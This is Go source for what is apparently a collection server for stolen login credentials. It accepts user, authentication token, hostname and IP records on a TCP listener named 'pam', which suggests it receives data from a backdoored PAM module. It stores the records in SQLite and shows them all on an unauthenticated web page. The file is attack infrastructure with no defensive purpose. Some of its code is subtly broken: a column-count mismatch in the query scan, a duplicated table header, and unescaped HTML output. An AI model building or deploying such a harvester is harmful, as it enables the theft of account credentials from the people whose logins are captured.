package main

import (
	"database/sql"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"

	_ "github.com/mattn/go-sqlite3"
)

func handleCredentialRequest(conn net.Conn, db *sql.DB) {
	buf := make([]byte, 512)
	n, err := conn.Read(buf)
	if err != nil {
		log.Println(err)
		return
	}
	defer conn.Close()

	fields := strings.Split(string(buf[:n]), ",")
	if len(fields) != 4 {
		log.Println("Error: invalid number of fields in input")
		return
	}

	stmt, err := db.Prepare("INSERT INTO credentials(user, authtok, hostname, ipaddr) values(?,?,?,?)")
	if err != nil {
		log.Println(err)
		return
	}
	_, err = stmt.Exec(fields[0], fields[1], fields[2], fields[3])
	if err != nil {
		log.Println(err)
	}
}

func createCredentialTable(db *sql.DB) error {
	credentialTable := `CREATE TABLE IF NOT EXISTS credentials (
		"id" integer NOT NULL PRIMARY KEY AUTOINCREMENT,		
		"user" TEXT,
		"authtok" TEXT,
		"hostname" TEXT,
		"ipaddr" TEXT		
	  );`

	_, err := db.Exec(credentialTable)
	if err != nil {
		return err
	}
	log.Println("Credentials table created")
	return nil
}

func handler(w http.ResponseWriter, db *sql.DB) {
	rows, err := db.Query("SELECT * FROM credentials")
	if err != nil {
		http.Error(w, "Error fetching credentials from the database", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	type credentialEntry struct {
		user     string
		authtok  string
		hostname string
		ipaddr   string
	}
	var credentials []credentialEntry

	for rows.Next() {
		var credential credentialEntry
		err := rows.Scan(
			&credential.user,
			&credential.authtok,
			&credential.hostname,
			&credential.ipaddr,
		)
		if err != nil {
			http.Error(w, "Error scanning credential from the database", http.StatusInternalServerError)
			return
		}
		credentials = append(credentials, credential)
	}

	if err := rows.Err(); err != nil {
		http.Error(w, "Error with rows", http.StatusInternalServerError)
		return
	}

	html := `
<!DOCTYPE html>
<html>
	<style>
	table, th, td {
	border:1px solid black;
	}
	</style>
	<body>
		<h2>Credentials</h2>
			<table style="width:100%">
			<tr>
				<th>user</th>
				<th>authtok</th>
				<th>hostname</th>
				<th>hostname</th>
			</tr>`

	for _, credential := range credentials {
		html += `
		<tr>
		  <td>` + credential.user + `</td>
		  <td>` + credential.authtok + `</td>
		  <td>` + credential.hostname + `</td>
		  <td>` + credential.ipaddr + `</td>
		</tr>`
	}

	html += `</table></body></html>`

	fmt.Fprintf(w, html)
}

func main() {
	db, err := sql.Open("sqlite3", "./creds.db")
	if err != nil {
		log.Fatalf("error opening database: %v", err)
	}
	defer db.Close()

	err = createCredentialTable(db)
	if err != nil {
		log.Fatalf("error creating credential table: %v", err)
	}

	pam, err := net.Listen("tcp", ":8081")
	if err != nil {
		log.Fatalf("error starting creds server: %v", err)
	}
	defer func() {
		if err := pam.Close(); err != nil {
			log.Fatalf("error closing pam listener: %v", err)
		}
	}()

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		handler(w, db)
	})

	go func() {
		log.Fatal(http.ListenAndServe(":8080", nil))
	}()

	for {
		conn, err := pam.Accept()
		if err != nil {
			log.Printf("error accepting connection: %v", err)
			continue
		}
		go func() {
			defer func() {
				if err := conn.Close(); err != nil {
					log.Printf("error closing connection: %v", err)
				}
			}()
			handleCredentialRequest(conn, db)
		}()
	}
}
